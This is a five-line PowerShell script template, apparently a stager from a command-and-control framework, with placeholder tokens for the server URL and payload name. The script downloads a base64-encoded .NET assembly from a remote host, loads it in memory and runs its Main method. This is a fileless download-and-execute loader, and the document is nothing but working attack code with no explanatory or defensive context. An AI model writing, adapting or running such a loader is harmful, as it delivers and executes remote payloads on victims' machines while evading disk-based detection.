$b64 = (New-Object System.Net.WebClient).DownloadString('#REPLACECONNECTURL#/#REPLACEQUICKCOMMAND##REPLACECSHARPFILENAME#');
$assem = [System.Reflection.Assembly]::Load([System.Convert]::frombase64string($b64));
$class = $assem.GetType("Program");
$method = $class.GetMethod("Main");
$method.Invoke(0, $null);

